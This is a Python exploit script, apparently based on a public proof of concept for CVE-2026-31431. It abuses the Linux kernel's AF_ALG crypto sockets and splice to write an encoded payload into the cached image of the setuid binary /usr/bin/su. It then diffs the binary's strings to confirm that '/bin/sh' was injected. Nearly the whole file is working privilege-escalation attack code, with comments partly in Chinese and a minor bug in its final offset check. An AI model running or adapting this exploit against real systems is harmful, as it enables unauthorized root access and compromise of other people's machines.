#!/usr/bin/env python3
# based on github.com/theori-io/copy-fail-CVE-2026-31431
import mmap
import os
import socket
import zlib
import re

def d(x):
    return bytes.fromhex(x)

def ascii_repr(b):
    return ''.join(chr(c) if 0x20 <= c < 0x7f else '.' for c in b)

def extract_strings(data, min_len=4):
    pattern = rb'[\x20-\x7e]{' + bytes(str(min_len), 'ascii') + b',}'
    strings = []
    for m in re.finditer(pattern, data):
        try:
            s = m.group().decode('ascii')
            strings.append(s)
        except:
            continue
    return strings

ELF_FIELD = {
    0x00: "e_ident",    0x10: "e_type",     0x12: "e_machine",
    0x14: "e_version",  0x18: "e_entry",    0x20: "e_phoff",
    0x28: "e_shoff",    0x30: "e_flags",    0x34: "e_ehsize",
    0x36: "e_phentsize",0x38: "e_phnum",    0x3a: "e_shentsize",
    0x3c: "e_shnum",    0x3e: "e_shstrndx",
}

def trigger(file_fd, offset, payload):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = offset + 4
    i = d('00')
    u.sendmsg(
        [b"A" * 4 + payload],
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
        32768
    )
    r, w = os.pipe()
    os.splice(file_fd, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)
    try:
        u.recv(8 + offset)
    except:
        0

f = os.open("/usr/bin/su", os.O_RDONLY)
size = os.path.getsize("/usr/bin/su")
m = mmap.mmap(f, size, mmap.MAP_SHARED, mmap.PROT_READ)

m.seek(0)
before_all = m.read()

# ======== 攻击前字符串 ========
before_strings = extract_strings(before_all)
print("\n[+] Strings BEFORE exploit (from /usr/bin/su):")
for s in sorted(set(before_strings)):
    print(f"    {repr(s)}")
if '/bin/sh' in before_strings:
    print("    *** WARNING: /bin/sh already present before? ***")
else:
    print("    (no /bin/sh found)")

# 触发漏洞
e = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

print(f"\n[+] /usr/bin/su size: {size} bytes")
print(f"[+] payload size: {len(e)} bytes")
print(f"[*] triggering copy_file_range writeback ...")

i = 0
while i < len(e):
    trigger(f, i, e[i:i+4])
    i += 4

m.flush()
after_all = m.read()

# ======== 攻击后字符串 ========
after_strings = extract_strings(after_all)
print("\n[+] Strings AFTER exploit:")
for s in sorted(set(after_strings)):
    print(f"    {repr(s)}")

# 对比
added = set(after_strings) - set(before_strings)
removed = set(before_strings) - set(after_strings)
print("\n[+] Changes in readable strings:")
if added:
    print("    NEW strings:")
    for s in sorted(added):
        if '/bin/sh' in s:
            print(f"        *** {repr(s)} ***  ← target shell path")
        else:
            print(f"        {repr(s)}")
if removed:
    print("    REMOVED strings:")
    for s in sorted(removed):
        print(f"        {repr(s)}")

# 原有变化字节输出（精简版）
changes = [off for off in range(min(len(before_all), len(after_all))) if before_all[off] != after_all[off]]
if changes:
    print(f"\n[+] Total bytes changed: {len(changes)}")
    # 只打印包含 /bin/sh 的偏移区域
    sh_offs = []
    for i in range(len(after_all)-6):
        if after_all[i:i+6] == b'/bin/sh':
            sh_offs.append(i)
    if sh_offs:
        print(f"[+] '/bin/sh' found at offsets: {sh_offs}")
else:
    print("\n[+] No byte changes detected (?)")

m.close()
os.close(f)